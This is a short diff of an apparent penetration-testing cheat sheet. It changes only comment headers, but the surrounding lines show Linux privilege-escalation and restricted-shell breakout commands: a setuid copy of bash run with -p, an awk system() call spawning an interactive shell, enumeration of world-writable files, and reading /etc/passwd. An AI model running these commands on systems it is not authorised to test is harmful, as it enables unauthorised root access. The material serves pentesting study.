@@ -1,5 +1,5 @@
 ```bash
-# [Interesting]
+# 
 sh -c 'cp $(which bash) .; chmod +s ./bash'
 ./bash -p
 ```
@@ -36,7 +36,7 @@ find / -name udev -exec /usr/bin/awk 'BEGIN {system("/bin/bash -i")}' \;
 ```
 
 ```bash
-# [Jailed SSH Shell? Try this...]
+# [Jailed SSH Shell? Try ...]
 # Initial Shell /bin/sh
 # If BASH is blocked
 # Check the 'env' variable!
@@ -69,7 +69,7 @@ stty columns 200 rows 200
 ```
 
 ```bash
-# [Once Broken Out - Before PrivEsc Reference - Perform These Commands...]
+# [Once Broken Out - Before PrivEsc Reference - Perform ...]
 find / -perm -2 ! -type l -ls 2>/dev/null |sort -r
 
 grep -vE "nologin|false" /etc/passwd
